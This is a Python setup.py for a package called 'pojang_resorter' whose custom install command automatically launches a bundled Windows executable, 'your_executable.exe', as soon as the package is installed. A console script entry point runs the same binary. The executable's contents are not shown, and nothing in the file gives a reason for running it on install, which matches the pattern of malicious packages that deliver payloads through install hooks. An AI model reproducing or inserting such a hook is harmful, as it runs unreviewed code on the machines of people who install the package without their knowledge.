from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import subprocess

class PostInstallCommand(install):
    def run(self):
        # Run the standard install process
        install.run(self)

        # Construct the path to the executable
        exe_path = os.path.join(self.install_lib, 'pojang_resorter', 'your_executable.exe')

        # Debug: Print path to verify it's correct
        print(f"Executable path: {exe_path}")

        # Check if the executable exists and run it
        if os.path.exists(exe_path):
            print(f"Running {exe_path}...")
            subprocess.run([exe_path], check=True)
        else:
            print(f"Executable not found: {exe_path}")

def run_executable():
    exe_path = os.path.join(os.path.dirname(__file__), 'pojang_resorter', 'your_executable.exe')
    if os.path.exists(exe_path):
        print(f"Running {exe_path}...")
        subprocess.run([exe_path], check=True)
    else:
        print(f"Executable not found: {exe_path}")

setup(
    name='pojang_resorter',
    version='1.9626',
    packages=find_packages(),
    include_package_data=True,
    cmdclass={
        'install': PostInstallCommand,  # Use the custom install command
    },
    entry_points={
        'console_scripts': [
            'pojang-resorter = setup:run_executable',  # Entry point to run the executable
        ],
    },
    # Add other metadata if necessary
)
